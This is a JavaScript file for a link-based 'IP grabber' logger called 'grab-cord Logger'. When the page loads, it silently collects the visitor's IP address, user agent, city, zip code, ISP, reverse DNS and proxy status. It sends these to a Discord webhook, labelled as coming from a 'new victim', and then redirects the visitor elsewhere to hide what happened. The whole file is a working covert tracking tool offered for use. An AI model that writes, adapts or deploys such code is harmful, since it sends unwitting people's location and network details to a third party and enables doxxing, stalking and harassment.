document.addEventListener("DOMContentLoaded", () => {
    const urlParams = new URLSearchParams(window.location.search);
    const webhookURL = urlParams.get("webhook");
    const redirectURL = urlParams.get("redirect");
  
    if (webhookURL) {
      // Fetch IP information from ip-api.com
      fetch("http://ip-api.com/json/?fields=continent,continentCode,country,region,regionName,city,zip,timezone,isp,reverse,mobile,proxy,query")
        .then((response) => response.json())
        .then((ipInfo) => {
          // Create the main embed object with IP information
          const main = {
            description: "**__A new victim just opened your URL:__**",
            thumbnail: {
              url: "https://i1.sndcdn.com/avatars-qoKvbOjOy1aF8Fnl-ZKqvUA-t500x500.jpg",
            },
            fields: [
              {
                name: "IP:",
                value: `\`${ipInfo.query}\``,
                inline: false,
              },
              {
                name: "User-Agent:",
                value: `\`${navigator.userAgent}\``,
                inline: false,
              },
              {
                name: "Continent:",
                value: `\`${ipInfo.continent}\``,
                inline: false,
              },
              {
                name: "Country:",
                value: `\`${ipInfo.country}\``,
                inline: false,
              },
              {
                name: "Region Name:",
                value: `\`${ipInfo.regionName}\``,
                inline: false,
              },
              {
                name: "City:",
                value: `\`${ipInfo.city}\``,
                inline: false,
              },
              {
                name: "Zip Code:",
                value: `\`${ipInfo.zip}\``,
                inline: false,
              },
              {
                name: "Timezone:",
                value: `\`${ipInfo.timezone}\``,
                inline: false,
              },
              {
                name: "ISP:",
                value: `\`${ipInfo.isp}\``,
                inline: false,
              },
              {
                name: "Reverse DNS:",
                value: `\`${ipInfo.reverse}\``,
                inline: false,
              },
              {
                name: "Mobile:",
                value: `\`${ipInfo.mobile}\``,
                inline: false,
              },
              {
                name: "Proxy:",
                value: `\`${ipInfo.proxy}\``,
                inline: false,
              },
            ],
            footer: {
              text: "made by @roc4et",
            },
            author: {
              name: "grab-cord Logger",
              url: "https://roc4et.de",
            },
          };
  
          // Send the embed data to Discord
          sendEmbedToDiscord(webhookURL, main, redirectURL);
        })
        .catch((error) => {
          console.error("Error fetching IP information:", error);
        });
    }
  });
  
  function sendEmbedToDiscord(webhookURL, embedData, redirectURL) {
    fetch(webhookURL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ embeds: [embedData] }),
    })
      .then((response) => {
        if (!response.ok) {
          console.error("Failed to send the embed to Discord.");
          return;
        }
  
        console.log("Embed sent successfully!");
  
        // Check if there's a redirectURL and then redirect to it
        if (redirectURL) {
          window.location.href = redirectURL;
        }
      })
      .catch((error) => {
        console.error("Error sending the embed:", error);
      });
  }
  